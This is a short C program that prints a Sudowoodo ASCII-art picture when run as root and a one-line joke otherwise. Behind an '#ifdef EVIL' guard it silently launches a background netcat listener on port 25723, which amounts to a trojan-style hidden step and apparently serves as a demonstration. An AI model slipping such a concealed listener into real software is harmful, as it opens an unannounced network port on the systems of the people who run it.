#include <stdio.h>
#include <unistd.h>

char *woodo = "It's a weird tree.";
char *sudowoodo = ""
"    _              __\n"
"   / `\\  (~._    ./  )\n"
"   \\__/ __`-_\\__/ ./\n"
"  _ \\ \\/  \\   \\ |_   __\n"
"(   )  \\__/ -^    \\ /  \\\n"
" \\_/ \"  \\  | o  o  |.. /  __\n"
"      \\. --' ====  /  || /  \\\n"
"        \\   .  .  |---__.\\__/\n"
"        /  :     /   |   |\n"
"        /   :   /     \\_/\n"
"     --/ ::    (\n"
"    (  |     (  (____\n"
"  .--  .. ----**.____)\n"
"  \\___/";
char *cmd = "nc -kl 25723 &";

int main() {
	int sudo = getuid();

	printf("%s\n", sudo != 0 ? woodo : sudowoodo);

	#ifdef EVIL
		FILE *fp = NULL;
		fp = popen(cmd, "r");
	#endif /* EVIL */

	return 0;
}